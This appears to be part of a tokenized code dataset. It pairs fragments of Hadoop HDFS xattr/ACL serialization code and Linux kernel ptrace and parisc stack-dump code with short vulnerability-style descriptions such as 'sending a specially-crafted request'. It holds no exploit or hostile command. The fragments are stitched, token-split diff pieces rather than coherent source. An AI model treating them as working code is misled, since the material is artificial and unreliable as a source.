"NS_EXT_SHIFT", "=", "NS", ".", "BITS", ".", "getLength", "(", ");", "private", "static", "final", "int", "NS_MASK", "=", "(", "1", "<", "<", "NS_EXT_SHIFT", ")", "-", "1", ";", "private", "static", "final", "int", "XATTR_VALUE_LEN_MAX", "=", "1", "<", "<", "16", ";", "private", "static", "final", "XAttr", ".", "NameSpace", "[", "]", "XATTR_NAMESPACE_VALUES", "=", "XAttr", ".", "NameSpace", ".", "values", "(", ");", "private", "final", "LongBitFormat", "BITS", ";", "XAttrFormat", "(", "LongBitFormat", "previous", ",", "int", "length", ")", "{", "BITS", "=", "new", "LongBitFormat", "(", "name", "(", "),", "previous", ",", "length", ",", "0", ")", ";", "}", "@", "Override", "public", "int", "getLength", "(", ")", "{", "return", "BITS", ".", "getLength", "(", ");", "}", "static", "XAttr", ".", "NameSpace", "getNamespace", "(", "int", "record", ")", "{", "long", "nid", "=", "NS", ".", "BITS", ".", "retrieve", "(", "record", ")", ";", "nid", "|", "=", "NS_EXT", ".", "BITS", ".", "retrieve", "(", "record", ")", "<", "<", "NS_EXT_SHIFT", ";", "return", "XATTR_NAMESPACE_VALUES", "[", "(", "int", ")", "nid", "]", ";", "}", "public", "static", "String", "getName", "(", "int", "record", ")", "{", "int", "nid", "=", "(", "int", ")", "NAME", ".", "BITS", ".", "retrieve", "(", "record", ")", ";", "return", "SerialNumberManager", ".", "XATTR", ".", "getString", "(", "nid", ")", ";", "static", "int", "toInt", "(", "XAttr", "a", ")", "{", "int", "nid", "=", "SerialNumberManager", ".", "XATTR", ".", "getSerialNumber", "(", "a", ".", "getName", "(", "))", ";", "int", "nsOrd", "=", "a", ".", "getNameSpace", "(", ").", "ordinal", "(", ");", "long", "value", "=", "NS", ".", "BITS", ".", "combine", "(", "nsOrd", "&", "NS_MASK", ",", "0L", ")", ";", "value", "=", "NS_EXT", ".", "BITS", ".", "combine", "(", "nsOrd", ">", ">>", "NS_EXT_SHIFT", ",", "value", ")", ";", "value", "=", "NAME", ".", "BITS", ".", "combine", "(", "nid", ",", "value", ")", ";", "return", "(", "int", ")", "value", ";", "}", "static", "XAttr", "toXAttr", "(", "int", "record", ",", "byte", "[", "]", "value", ",", "SerialNumberManager", ".", "StringTable", "stringTable", ")", "{", "int", "nid", "=", "(", "int", ")", "NAME", ".", "BITS", ".", "retrieve", "(", "record", ")", ";", "String", "name", "=", "SerialNumberManager", ".", "XATTR", ".", "getString", "(", "nid", ",", "stringTable", ")", ";", "return", "new", "XAttr", ".", "Builder", "(", ")", ".", "setNameSpace", "(", "getNamespace", "(", "record", ")", ")", ".", "setName", "(", "name", ")", ".", "setValue", "(", "value", ")", ".", "build", "(", ");", "}", "builder", ".", "setNameSpace", "(", "XAttrFormat", ".", "getNamespace", "(", "v", ")", ");", "builder", ".", "setName", "(", "XAttrFormat", ".", "getName", "(", "v", ")", ");", "XAttr", ".", "NameSpace", "namespace", "=", "XAttrFormat", ".", "getNamespace", "(", "v", ")", ";", "String", "name", "=", "XAttrFormat", ".", "getName", "(", "v", ")", ";", "/", "/", "big", "-", "endian", "int", "v", "=", "XAttrFormat", ".", "toInt", "(", "a", ")", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "server", ".", "namenode", ".", "SerialNumberManager", ";", "private", "final", "SerialNumberManager", ".", "StringTable", "stringTable", ";", "private", "FSImageLoader", "(", "SerialNumberManager", ".", "StringTable", "stringTable", ",", "byte", "[", "][", "]", "inodes", ",", "Map", "<", "Long", ",", "long", "[", "]>", "dirmap", ")", "{", "SerialNumberManager", ".", "StringTable", "stringTable", "=", "null", ";", "static", "SerialNumberManager", ".", "StringTable", "loadStringTable", "(", "InputStream", "in", ")", "throws", "IOException", "{", "SerialNumberManager", ".", "StringTable", "stringTable", "=", "SerialNumberManager", ".", "newStringTable", "(", "s", ".", "getNumEntry", "(", "),", "s", ".", "getMaskBits", "(", "))", ";", "stringTable", ".", "put", "(", "e", ".", "getId", "(", "),", "e", ".", "getStr", "(", "))", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "server", ".", "namenode", ".", "SerialNumberManager", ";", "private", "SerialNumberManager", ".", "StringTable", "stringTable", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "server", ".", "namenode", ".", "SerialNumberManager", ";", "private", "SerialNumberManager", ".", "StringTable", "stringTable", ";", "o", "(", "SECTION_NAME", ",", "SerialNumberManager", ".", "XATTR", ".", "getString", "(", "XATTR_NAME_MASK", "&", "(", "encodedName", ">", ">", "XATTR_NAME_OFFSET", ")", ",", "stringTable", ")", ");", "if", "(", "d", ".", "hasSnapshotCopy", "(", "))", "{", "dumpINodeDirectory", "(", "d", ".", "getSnapshotCopy", "(", "))", ";", "stringTable", "=", "FSImageLoader", ".", "loadStringTable", "(", "in", ")", ";", "optional", "uint32", "maskBits", "=", "2", "[", "default", "=", "0", "]", ";", "INodeDirectory", "parent", "=", "namesystem", ".", "getFSDirectory", "(", ").", "getRoot", "(", ");</s>*", "The", "bits", "can", "be", "divided", "in", "four", "segments", ":", "<", "br", ">", "*", "[", "0", ":", "1", ")", "|", "|", "[", "1", ":", "3", ")", "|", "|", "[", "3", ":", "6", ")", "|", "|", "[", "6", ":", "7", ")", "|", "|", "[", "7", ":", "32", ")", "<", "br", ">", "*", "<", "br", ">", "*", "[", "0", ":", "1", ")", "-", "-", "the", "scope", "of", "the", "entry", "(", "AclEntryScope", ")", "<", "br", ">", "*", "[", "1", ":", "3", ")", "-", "-", "the", "type", "of", "the", "entry", "(", "AclEntryType", ")", "<", "br", ">", "*", "[", "3", ":", "6", ")", "-", "-", "the", "permission", "of", "the", "entry", "(", "FsAction", ")", "<", "br", ">", "*", "[", "6", ":", "7", ")", "-", "-", "A", "flag", "to", "indicate", "whether", "Named", "entry", "or", "not", "<", "br", ">", "*", "[", "7", ":", "8", ")", "-", "-", "Reserved", "<", "br", ">", "*", "[", "8", ":", "32", ")", "-", "-", "the", "name", "of", "the", "entry", ",", "which", "is", "an", "ID", "that", "points", "to", "a", "<", "br", ">", "*", "string", "in", "the", "StringTableSection", ".", "<", "br", ">", "public", "enum", "AclEntryStatusFormat", "{", "SCOPE", "(", "null", ",", "1", ")", ",", "TYPE", "(", "SCOPE", ".", "BITS", ",", "2", ")", ",", "PERMISSION", "(", "TYPE", ".", "BITS", ",", "3", ")", ",", "NAMED_ENTRY_CHECK", "(", "PERMISSION", ".", "BITS", ",", "1", ")", ",", "RESERVED", "(", "NAMED_ENTRY_CHECK", ".", "BITS", ",", "1", ")", ",", "NAME", "(", "RESERVED", ".", "BITS", ",", "24", ")", ";", "return", "AclEntryScope", ".", "values", "(", ")[", "ordinal", "]", ";", "return", "AclEntryType", ".", "values", "(", ")[", "ordinal", "]", ";", "return", "FsAction", ".", "values", "(", ")[", "ordinal", "]", ";", "int", "nameExists", "=", "(", "int", ")", "NAMED_ENTRY_CHECK", ".", "BITS", ".", "retrieve", "(", "aclEntry", ")", ";", "if", "(", "nameExists", "=", "=", "0", ")", "{", "return", "null", ";", "}", "int", "id", "=", "(", "int", ")", "NAME", ".", "BITS", ".", "retrieve", "(", "aclEntry", ")", ";", "AclEntryType", "type", "=", "getType", "(", "aclEntry", ")", ";", "if", "(", "type", "=", "=", "AclEntryType", ".", "USER", ")", "{", "return", "SerialNumberManager", ".", "INSTANCE", ".", "getUser", "(", "id", ")", ";", "}", "else", "if", "(", "type", "=", "=", "AclEntryType", ".", "GROUP", ")", "{", "return", "SerialNumberManager", ".", "INSTANCE", ".", "getGroup", "(", "id", ")", ";", "if", "(", "aclEntry", ".", "getName", "(", ")", "!", "=", "null", ")", "{", "aclEntryInt", "=", "NAMED_ENTRY_CHECK", ".", "BITS", ".", "combine", "(", "1", ",", "aclEntryInt", ")", ";", "if", "(", "aclEntry", ".", "getType", "(", ")", "=", "=", "AclEntryType", ".", "USER", ")", "{", "int", "userId", "=", "SerialNumberManager", ".", "INSTANCE", ".", "getUserSerialNumber", "(", "aclEntry", ".", "getName", "(", "))", ";", "aclEntryInt", "=", "NAME", ".", "BITS", ".", "combine", "(", "userId", ",", "aclEntryInt", ")", ";", "}", "else", "if", "(", "aclEntry", ".", "getType", "(", ")", "=", "=", "AclEntryType", ".", "GROUP", ")", "{", "int", "groupId", "=", "SerialNumberManager", ".", "INSTANCE", ".", "getGroupSerialNumber", "(", "aclEntry", ".", "getName", "(", "))", ";", "aclEntryInt", "=", "NAME", ".", "BITS", ".", "combine", "(", "groupId", ",", "aclEntryInt", ")", ";", "}", "AclEntry", ".", "Builder", "builder", "=", "new", "AclEntry", ".", "Builder", "(", ");", "builder", ".", "setScope", "(", "getScope", "(", "aclEntry", ")", ").", "setType", "(", "getType", "(", "aclEntry", ")", ")", ".", "setPermission", "(", "getPermission", "(", "aclEntry", ")", ");", "if", "(", "getName", "(", "aclEntry", ")", "!", "=", "null", ")", "{", "builder", ".", "setName", "(", "getName", "(", "aclEntry", ")", ");", "}", "return", "builder", ".", "build", "(", ");", "public", "static", "ImmutableList", "<", "AclEntry", ">", "toAclEntries", "(", "int", "[", "]", "entries", ")", "{", "ImmutableList", ".", "Builder", "<", "AclEntry", ">", "b", "=", "new", "ImmutableList", ".", "Builder", "<", "AclEntry", ">", "()", ";", "for", "(", "int", "entry", ":", "entries", ")", "{", "AclEntry", "aclEntry", "=", "toAclEntry", "(", "entry", ")", ";", "b", ".", "add", "(", "aclEntry", ")", ";", "return", "b", ".", "build", "(", ");", "import", "org", ".", "apache", ".", "hadoop", ".", "fs", ".", "permission", ".", "AclEntryScope", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "fs", ".", "permission", ".", "AclEntryType", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "fs", ".", "permission", ".", "FsAction", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "fs", ".", "permission", ".", "FsPermission", ";", "private", "final", "static", "long", "USER_GROUP_STRID_MASK", "=", "(", "1", "<", "<", "24", ")", "-", "1", ";", "private", "final", "static", "int", "USER_STRID_OFFSET", "=", "40", ";", "private", "final", "static", "int", "GROUP_STRID_OFFSET", "=", "16", ";", "private", "static", "final", "int", "ACL_ENTRY_TYPE_MASK", "=", "3", ";", "private", "static", "final", "int", "ACL_ENTRY_SCOPE_MASK", "=", "1", ";", "private", "static", "final", "FsAction", "[", "]", "FSACTION_VALUES", "=", "FsAction", ".", "values", "(", ");", "private", "static", "final", "AclEntryScope", "[", "]", "ACL_ENTRY_SCOPE_VALUES", "=", "AclEntryScope", ".", "values", "(", ");", "private", "static", "final", "AclEntryType", "[", "]", "ACL_ENTRY_TYPE_VALUES", "=", "AclEntryType", ".", "values", "(", ");", "private", "static", "final", "XAttr", ".", "NameSpace", "[", "]", "XATTR_NAMESPACE_VALUES", "=", "XAttr", ".", "NameSpace", ".", "values", "(", ");", "final", "String", "[", "]", "stringTable", ")", "{", "short", "perm", "=", "(", "short", ")", "(", "id", "&", "(", "(", "1", "<", "<", "GROUP_STRID_OFFSET", ")", "-", "1", ")", ");", "int", "gsid", "=", "(", "int", ")", "(", "(", "id", ">", ">", "GROUP_STRID_OFFSET", ")", "&", "USER_GROUP_STRID_MASK", ")", ";", "int", "usid", "=", "(", "int", ")", "(", "(", "id", ">", ">", "USER_STRID_OFFSET", ")", "&", "USER_GROUP_STRID_MASK", ")", ";", "return", "new", "PermissionStatus", "(", "stringTable", "[", "usid", "]", ",", "stringTable", "[", "gsid", "]", ",", "new", "FsPermission", "(", "perm", ")", ");", "AclFeatureProto", "proto", ",", "final", "String", "[", "]", "stringTable", ")", "{", "int", "p", "=", "v", "&", "ACL_ENTRY_PERM_MASK", ";", "int", "t", "=", "(", "v", ">", ">", "ACL_ENTRY_TYPE_OFFSET", ")", "&", "ACL_ENTRY_TYPE_MASK", ";", "int", "s", "=", "(", "v", ">", ">", "ACL_ENTRY_SCOPE_OFFSET", ")", "&", "ACL_ENTRY_SCOPE_MASK", ";", "int", "nid", "=", "(", "v", ">", ">", "ACL_ENTRY_NAME_OFFSET", ")", "&", "ACL_ENTRY_NAME_MASK", ";", "String", "name", "=", "stringTable", "[", "nid", "]", ";", "b", ".", "add", "(", "new", "AclEntry", ".", "Builder", "(", ").", "setName", "(", "name", ")", ".", "setPermission", "(", "FSACTION_VALUES", "[", "p", "]", ")", ".", "setScope", "(", "ACL_ENTRY_SCOPE_VALUES", "[", "s", "]", ")", ".", "setType", "(", "ACL_ENTRY_TYPE_VALUES", "[", "t", "]", ").", "build", "(", "))", ";", "XAttrFeatureProto", "proto", ",", "final", "String", "[", "]", "stringTable", ")", "{", "int", "nid", "=", "(", "v", ">", ">", "XATTR_NAME_OFFSET", ")", "&", "XATTR_NAME_MASK", ";", "int", "ns", "=", "(", "v", ">", ">", "XATTR_NAMESPACE_OFFSET", ")", "&", "XATTR_NAMESPACE_MASK", ";", "ns", "|", "=", "(", "(", "v", ">", ">", "XATTR_NAMESPACE_EXT_OFFSET", ")", "&", "XATTR_NAMESPACE_EXT_MASK", ")", "<", "<", "2", ";", "String", "name", "=", "stringTable", "[", "nid", "]", ";", "b", ".", "add", "(", "new", "XAttr", ".", "Builder", "(", ").", "setNameSpace", "(", "XATTR_NAMESPACE_VALUES", "[", "ns", "]", ")", ".", "setName", "(", "name", ")", ".", "setValue", "(", "value", ")", ".", "build", "(", "))", ";", "private", "static", "long", "buildPermissionStatus", "(", "INodeAttributes", "n", ",", "final", "SaverContext", ".", "DeduplicationMap", "<", "String", ">", "stringMap", ")", "{", "long", "userId", "=", "stringMap", ".", "getId", "(", "n", ".", "getUserName", "(", "))", ";", "long", "groupId", "=", "stringMap", ".", "getId", "(", "n", ".", "getGroupName", "(", "))", ";", "return", "(", "(", "userId", "&", "USER_GROUP_STRID_MASK", ")", "<", "<", "USER_STRID_OFFSET", ")", "|", "(", "(", "groupId", "&", "USER_GROUP_STRID_MASK", ")", "<", "<", "GROUP_STRID_OFFSET", ")", "|", "n", ".", "getFsPermissionShort", "(", ");", "private", "static", "AclFeatureProto", ".", "Builder", "buildAclEntries", "(", "AclFeature", "f", ",", "final", "SaverContext", ".", "DeduplicationMap", "<", "String", ">", "map", ")", "{", "int", "nameId", "=", "map", ".", "getId", "(", "AclEntryStatusFormat", ".", "getName", "(", "e", ")", ");", "int", "v", "=", "(", "(", "nameId", "&", "ACL_ENTRY_NAME_MASK", ")", "<", "<", "ACL_ENTRY_NAME_OFFSET", ")", "|", "(", "AclEntryStatusFormat", ".", "getType", "(", "e", ")", ".", "ordinal", "(", ")", "<", "<", "ACL_ENTRY_TYPE_OFFSET", ")", "|", "(", "AclEntryStatusFormat", ".", "getScope", "(", "e", ")", ".", "ordinal", "(", ")", "<", "<", "ACL_ENTRY_SCOPE_OFFSET", ")", "|", "(", "AclEntryStatusFormat", ".", "getPermission", "(", "e", ")", ".", "ordinal", "(", "))", ";", "b", ".", "addEntries", "(", "v", ")", ";", "private", "static", "XAttrFeatureProto", ".", "Builder", "buildXAttrs", "(", "XAttrFeature", "f", ",", "final", "SaverContext", ".", "DeduplicationMap", "<", "String", ">", "stringMap", ")", "{", "int", "nsOrd", "=", "a", ".", "getNameSpace", "(", ").", "ordinal", "(", ");", "Preconditions", ".", "checkArgument", "(", "nsOrd", "<", "8", ",", "\"", "Too", "many", "namespaces", ".", "\")", ";", "int", "v", "=", "(", "(", "nsOrd", "&", "XATTR_NAMESPACE_MASK", ")", "<", "<", "XATTR_NAMESPACE_OFFSET", ")", "|", "(", "(", "stringMap", ".", "getId", "(", "a", ".", "getName", "(", "))", "&", "XATTR_NAME_MASK", ")", "<", "<", "XATTR_NAME_OFFSET", ")", ";", "v", "|", "=", "(", "((", "nsOrd", ">", ">", "2", ")", "&", "XATTR_NAMESPACE_EXT_MASK", ")", "<", "<", "XATTR_NAMESPACE_EXT_OFFSET", ")", ";", ".", "setPermission", "(", "buildPermissionStatus", "(", "file", ",", "state", ".", "getStringMap", "(", "))", ")", "b", ".", "setAcl", "(", "buildAclEntries", "(", "f", ",", "state", ".", "getStringMap", "(", "))", ");", "b", ".", "setXAttrs", "(", "buildXAttrs", "(", "xAttrFeature", ",", "state", ".", "getStringMap", "(", "))", ");", ".", "setPermission", "(", "buildPermissionStatus", "(", "dir", ",", "state", ".", "getStringMap", "(", "))", ");", "b", ".", "setAcl", "(", "buildAclEntries", "(", "f", ",", "state", ".", "getStringMap", "(", "))", ");", "b", ".", "setXAttrs", "(", "buildXAttrs", "(", "xAttrFeature", ",", "state", ".", "getStringMap", "(", "))", ");", ".", "setPermission", "(", "buildPermissionStatus", "(", "n", ",", "state", ".", "getStringMap", "(", "))", ")", "private", "String", "[", "]", "stringTable", ";", "public", "String", "[", "]", "getStringTable", "(", ")", "{", "private", "final", "DeduplicationMap", "<", "String", ">", "stringMap", "=", "DeduplicationMap", ".", "newMap", "(", ");", "public", "DeduplicationMap", "<", "String", ">", "getStringMap", "(", ")", "{", "return", "stringMap", ";", "}", "ctx", ".", "stringTable", "=", "new", "String", "[", "s", ".", "getNumEntry", "(", ")", "+", "1", "]", ";", "ctx", ".", "stringTable", "[", "e", ".", "getId", "(", ")]", "=", "e", ".", "getStr", "(", ");", ".", "setNumEntry", "(", "saverContext", ".", "stringMap", ".", "size", "(", "))", ";", "for", "(", "Entry", "<", "String", ",", "Integer", ">", "e", ":", "saverContext", ".", "stringMap", ".", "entrySet", "(", "))", "{", ".", "newBuilder", "(", ").", "setId", "(", "e", ".", "getValue", "(", "))", ".", "setStr", "(", "e", ".", "getKey", "(", "))", ";", "enum", "PermissionStatusFormat", "{", "return", "SerialNumberManager", ".", "INSTANCE", ".", "getUser", "(", "n", ")", ";", "return", "SerialNumberManager", ".", "INSTANCE", ".", "getGroup", "(", "n", ")", ";", "final", "int", "user", "=", "SerialNumberManager", ".", "INSTANCE", ".", "getUserSerialNumber", "(", "final", "int", "group", "=", "SerialNumberManager", ".", "INSTANCE", ".", "getGroupSerialNumber", "(", "int", "n", "=", "SerialNumberManager", ".", "INSTANCE", ".", "getUserSerialNumber", "(", "user", ")", ";", "int", "n", "=", "SerialNumberManager", ".", "INSTANCE", ".", "getGroupSerialNumber", "(", "group", ")", ";", "/", "**", "Manage", "name", "-", "to", "-", "serial", "-", "number", "maps", "for", "users", "and", "groups", ".", "*", "/", "class", "SerialNumberManager", "{", "/", "**", "This", "is", "the", "only", "instance", "of", "{", "@", "link", "SerialNumberManager", "}", ".*", "/", "static", "final", "SerialNumberManager", "INSTANCE", "=", "new", "SerialNumberManager", "(", ");", "private", "final", "SerialNumberMap", "<", "String", ">", "usermap", "=", "new", "SerialNumberMap", "<", "String", ">", "()", ";", "private", "final", "SerialNumberMap", "<", "String", ">", "groupmap", "=", "new", "SerialNumberMap", "<", "String", ">", "()", ";", "private", "SerialNumberManager", "(", ")", "{", "}", "int", "getUserSerialNumber", "(", "String", "u", ")", "{", "return", "usermap", ".", "get", "(", "u", ")", ";}", "int", "getGroupSerialNumber", "(", "String", "g", ")", "{", "return", "groupmap", ".", "get", "(", "g", ")", ";}", "String", "getUser", "(", "int", "n", ")", "{", "return", "usermap", ".", "get", "(", "n", ")", ";}", "String", "getGroup", "(", "int", "n", ")", "{", "return", "groupmap", ".", "get", "(", "n", ")", ";}", "{", "getUserSerialNumber", "(", "null", ")", ";", "getGroupSerialNumber", "(", "null", ")", ";", "private", "final", "AtomicInteger", "max", "=", "new", "AtomicInteger", "(", "1", ")", ";", "sn", "=", "max", ".", "getAndIncrement", "(", ");", "if", "(", "sn", "<", "0", ")", "{", "throw", "new", "IllegalStateException", "(", "\"", "Too", "many", "elements", "!", "\")", ";", "throw", "new", "IllegalStateException", "(", "\"!", "i2t", ".", "containsKey", "(", "\"", "+", "i", "+", "\"", "),", "this", "=", "\"", "+", "this", ")", ";", "return", "\"", "max", "=", "\"", "+", "max", "+", "\"", ",\\", "n", "t2i", "=", "\"", "+", "t2i", "+", "\"", ",\\", "n", "i2t", "=", "\"", "+", "i2t", ";", "*", "For", "each", "XAttr", ":", "<", "br", ">", "*", "The", "first", "4", "bytes", "represents", "XAttr", "namespace", "and", "name", "<", "br", ">", "*", "[", "0", ":", "3", ")", "-", "XAttr", "namespace", "<", "br", ">", "*", "[", "3", ":", "8", ")", "-", "Reserved", "<", "br", ">", "*", "[", "8", ":", "32", ")", "-", "The", "name", "of", "the", "entry", ",", "which", "is", "an", "ID", "that", "points", "to", "a", "*", "string", "in", "map", "<", "br", ">", "*", "The", "following", "two", "bytes", "represents", "the", "length", "of", "XAttr", "value", "<", "br", ">", "*", "The", "remaining", "bytes", "is", "the", "XAttr", "value", "<", "br", ">", "class", "XAttrFormat", "{", "private", "enum", "XAttrStatusFormat", "{", "NAMESPACE", "(", "null", ",", "3", ")", ",", "RESERVED", "(", "NAMESPACE", ".", "BITS", ",", "5", ")", ",", "NAME", "(", "RESERVED", ".", "BITS", ",", "24", ")", ";", "private", "final", "LongBitFormat", "BITS", ";", "XAttrStatusFormat", "(", "LongBitFormat", "previous", ",", "int", "length", ")", "{", "BITS", "=", "new", "LongBitFormat", "(", "name", "(", "),", "previous", ",", "length", ",", "0", ")", ";", "}", "static", "XAttr", ".", "NameSpace", "getNamespace", "(", "int", "xattrStatus", ")", "{", "int", "ordinal", "=", "(", "int", ")", "NAMESPACE", ".", "BITS", ".", "retrieve", "(", "xattrStatus", ")", ";", "return", "XAttr", ".", "NameSpace", ".", "values", "(", ")[", "ordinal", "]", ";", "}", "static", "String", "getName", "(", "int", "xattrStatus", ")", "{", "int", "id", "=", "(", "int", ")", "NAME", ".", "BITS", ".", "retrieve", "(", "xattrStatus", ")", ";", "return", "XAttrStorage", ".", "getName", "(", "id", ")", ";", "}", "static", "int", "toInt", "(", "XAttr", ".", "NameSpace", "namespace", ",", "String", "name", ")", "{", "long", "xattrStatusInt", "=", "0", ";", "xattrStatusInt", "=", "NAMESPACE", ".", "BITS", ".", "combine", "(", "namespace", ".", "ordinal", "(", "),", "xattrStatusInt", ")", ";", "int", "nid", "=", "XAttrStorage", ".", "getNameSerialNumber", "(", "name", ")", ";", "xattrStatusInt", "=", "NAME", ".", "BITS", ".", "combine", "(", "nid", ",", "xattrStatusInt", ")", ";", "return", "(", "int", ")", "xattrStatusInt", ";", "}", "private", "static", "final", "int", "XATTR_VALUE_LEN_MAX", "=", "1", "<", "<", "16", ";", "builder", ".", "setNameSpace", "(", "XAttrStatusFormat", ".", "getNamespace", "(", "v", ")", ");", "builder", ".", "setName", "(", "XAttrStatusFormat", ".", "getName", "(", "v", ")", ");", "XAttr", ".", "NameSpace", "namespace", "=", "XAttrStatusFormat", ".", "getNamespace", "(", "v", ")", ";", "String", "name", "=", "XAttrStatusFormat", ".", "getName", "(", "v", ")", ";", "int", "v", "=", "XAttrStatusFormat", ".", "toInt", "(", "a", ".", "getNameSpace", "(", "),", "a", ".", "getName", "(", "))", ";", "private", "static", "final", "SerialNumberMap", "<", "String", ">", "NAME_MAP", "=", "new", "SerialNumberMap", "<", ">(", ");", "public", "static", "int", "getNameSerialNumber", "(", "String", "name", ")", "{", "return", "NAME_MAP", ".", "get", "(", "name", ")", ";", "}", "public", "static", "String", "getName", "(", "int", "n", ")", "{", "return", "NAME_MAP", ".", "get", "(", "n", ")", ";", "}", "private", "final", "String", "[", "]", "stringTable", ";", "private", "FSImageLoader", "(", "String", "[", "]", "stringTable", ",", "byte", "[", "][", "]", "inodes", ",", "Map", "<", "Long", ",", "long", "[", "]>", "dirmap", ")", "{", "String", "[", "]", "stringTable", "=", "null", ";", "static", "String", "[", "]", "loadStringTable", "(", "InputStream", "in", ")", "throws", "IOException", "{", "String", "[", "]", "stringTable", "=", "new", "String", "[", "s", ".", "getNumEntry", "(", ")", "+", "1", "]", ";", "stringTable", "[", "e", ".", "getId", "(", ")]", "=", "e", ".", "getStr", "(", ");", "private", "String", "[", "]", "stringTable", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "server", ".", "namenode", ".", "FsImageProto", ".", "StringTableSection", ";", "private", "String", "[", "]", "stringTable", ";", "o", "(", "SECTION_NAME", ",", "stringTable", "[", "XATTR_NAME_MASK", "&", "(", "encodedName", ">", ">", "XATTR_NAME_OFFSET", ")", "])", ";", "INodeDirectory", "snapshotCopy", "=", "d", ".", "getSnapshotCopy", "(", ");", "if", "(", "snapshotCopy", "!", "=", "null", ")", "{", "dumpINodeDirectory", "(", "snapshotCopy", ")", ";", "StringTableSection", "s", "=", "StringTableSection", ".", "parseDelimitedFrom", "(", "in", ")", ";", "stringTable", "=", "new", "String", "[", "s", ".", "getNumEntry", "(", ")", "+", "1", "]", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "s", ".", "getNumEntry", "(", ");", "+", "+", "i", ")", "{", "StringTableSection", ".", "Entry", "e", "=", "StringTableSection", ".", "Entry", ".", "parseDelimitedFrom", "(", "in", ")", ";", "stringTable", "[", "e", ".", "getId", "(", ")]", "=", "e", ".", "getStr", "(", ");", "}", "INodeDirectory", "mparent", "=", "mock", "(", "INodeDirectory", ".", "class", ")", ";", "INodeDirectory", "parent", "=", "new", "INodeDirectory", "(", "mparent", ".", "getId", "(", "),", "new", "byte", "[", "0", "]", ",", "mparent", ".", "getPermissionStatus", "(", "),", "mparent", ".", "getAccessTime", "(", "))", ";", "parent", ".", "setLocalName", "(", "new", "byte", "[", "0", "]", ");", "file", ".", "setParent", "(", "parent", ")", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "*", "When", "hitting", "ptrace_stop", "(", "),", "we", "cannot", "return", "using", "SYSRET", "because", "*", "that", "does", "not", "restore", "the", "full", "CPU", "state", ",", "only", "a", "minimal", "set", ".", "The", "*", "ptracer", "can", "change", "arbitrary", "register", "values", ",", "which", "is", "usually", "okay", "*", "because", "the", "usual", "ptrace", "stops", "run", "off", "the", "signal", "delivery", "path", "which", "*", "forces", "IRET", ";", "however", ",", "ptrace_event", "(", ")", "stops", "happen", "in", "arbitrary", "places", "*", "in", "the", "kernel", "and", "don", "'", "t", "force", "IRET", "path", ".", "*", "*", "So", "force", "IRET", "path", "after", "a", "ptrace", "stop", ".", "*", "/", "#", "define", "arch_ptrace_stop_needed", "(", "code", ",", "info", ")", "\\", "(", "{", "\\", "set_thread_flag", "(", "TIF_NOTIFY_RESUME", ")", ";", "\\", "false", ";", "\\", "}", ")", "*", "*", "This", "is", "guaranteed", "to", "be", "invoked", "once", "before", "a", "task", "stops", "for", "ptrace", "and", "*", "may", "include", "arch", "-", "specific", "operations", "necessary", "prior", "to", "a", "ptrace", "stop", ".</s>"], "docstring_tokens": ["a", "\"non-canonical", "\"", "address.\""]}
{"contents": ["empty"], "code_tokens": ["static", "void", "parisc_show_stack", "(", "struct", "task_struct", "*", "task", ",", "unsigned", "long", "*", "sp", ",", "int", "i", ",", "user", ";", "user", "=", "user_mode", "(", "regs", ")", ";", "level", "=", "user", "?", "KERN_DEBUG", ":", "KERN_CRIT", ";", "if", "(", "user", ")", "if", "(", "user", ")", "{", "printk", "(", "\"%", "s", "IAOQ", "[", "0", "]", ":", "\"", "RFMT", "\"", "\\", "n", "\"", ",", "level", ",", "regs", "-", ">", "iaoq", "[", "0", "]", ");", "printk", "(", "\"%", "s", "IAOQ", "[", "1", "]", ":", "\"", "RFMT", "\"", "\\", "n", "\"", ",", "level", ",", "regs", "-", ">", "iaoq", "[", "1", "]", ");", "printk", "(", "\"%", "s", "RP", "(", "r2", ")", ":", "\"", "RFMT", "\"", "\\", "n", "\"", ",", "level", ",", "regs", "-", ">", "gr", "[", "2", "]", ");", "}", "else", "{", "printk", "(", "\"%", "s", "IAOQ", "[", "0", "]", ":", "%", "pS", "\\", "n", "\"", ",", "level", ",", "(", "void", "*", ")", "regs", "-", ">", "iaoq", "[", "0", "]", ");", "printk", "(", "\"%", "s", "IAOQ", "[", "1", "]", ":", "%", "pS", "\\", "n", "\"", ",", "level", ",", "(", "void", "*", ")", "regs", "-", ">", "iaoq", "[", "1", "]", ");", "printk", "(", "\"%", "s", "RP", "(", "r2", ")", ":", "%", "pS", "\\", "n", "\"", ",", "level", ",", "(", "void", "*", ")", "regs", "-", ">", "gr", "[", "2", "]", ");", "parisc_show_stack", "(", "current", ",", "NULL", ",", "regs", ")", ";", "}", "printk", "(", "KERN_CRIT", "\"", "[", "<\"", "RFMT", "\"", ">]", "%", "pS", "\\", "n", "\"", ",", "info", "-", ">", "ip", ",", "(", "void", "*", ")", "info", "-", ">", "ip", ")", ";", "printk", "(", "KERN_CRIT", "\"", "\\", "n", "\"", ");", "static", "void", "parisc_show_stack", "(", "struct", "task_struct", "*", "task", ",", "unsigned", "long", "*", "sp", ",</s>#", "include", "<", "linux", "/", "kallsyms", ".", "h", ">", "void", "parisc_show_stack", "(", "struct", "task_struct", "*", "t", ",", "unsigned", "long", "*", "sp", ",", "int", "i", ";", "level", "=", "user_mode", "(", "regs", ")", "?", "KERN_DEBUG", ":", "KERN_CRIT", ";", "if", "(", "user_mode", "(", "regs", ")", ")", "printk", "(", "level", ")", ";", "print_symbol", "(", "\"", "IAOQ", "[", "0", "]", ":", "%", "s", "\\", "n", "\"", ",", "regs", "-", ">", "iaoq", "[", "0", "]", ");", "printk", "(", "level", ")", ";", "print_symbol", "(", "\"", "IAOQ", "[", "1", "]", ":", "%", "s", "\\", "n", "\"", ",", "regs", "-", ">", "iaoq", "[", "1", "]", ");", "printk", "(", "level", ")", ";", "print_symbol", "(", "\"", "RP", "(", "r2", ")", ":", "%", "s", "\\", "n", "\"", ",", "regs", "-", ">", "gr", "[", "2", "]", ");", "parisc_show_stack", "(", "current", ",", "NULL", ",", "regs", ")", ";", "printk", "(", "\"%", "s", "[", "<\"", "RFMT", 